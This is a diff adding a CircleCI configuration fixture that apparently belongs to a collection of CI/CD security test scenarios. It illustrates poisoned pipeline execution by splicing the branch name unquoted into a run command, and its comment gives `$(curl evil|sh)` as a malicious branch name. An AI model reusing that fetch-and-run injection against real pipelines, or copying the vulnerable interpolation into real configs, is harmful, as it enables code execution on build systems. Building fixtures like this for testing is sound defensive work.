@@ -1,0 +1,26 @@
+# scenarios/56-circleci-run-injection
+# CICD-SEC-4 (Poisoned Pipeline Execution) — CircleCI
+#
+# Pattern: an attacker-controlled pipeline value — `<< pipeline.git.branch >>`,
+# `<< pipeline.git.tag >>`, or an API-supplied `<< parameters.* >>` — is
+# interpolated directly into a `run:` shell command. Branch/tag names and
+# API-triggered parameters are attacker-controllable, so a branch named
+# `$(curl evil|sh)` executes on the executor. Analogue of scenarios 02 / 31.
+#
+# SAFETY: static fixture, nested under scenarios/ (CircleCI runs only the root
+# config.yml). See README.md.
+
+version: 2.1
+
+workflows:
+  build:
+    jobs:
+      - greet
+
+jobs:
+  greet:
+    docker:
+      - image: cimg/base@sha256:1d3f5a7c9e2b4d6f8a0c2e4b6d8f0a1c3e5b7d9f1a3c5e7b9d0f2a4c6e8b0d2f
+    steps:
+      # DANGER — branch name spliced into the shell command unquoted.
+      - run: echo "Building << pipeline.git.branch >>"
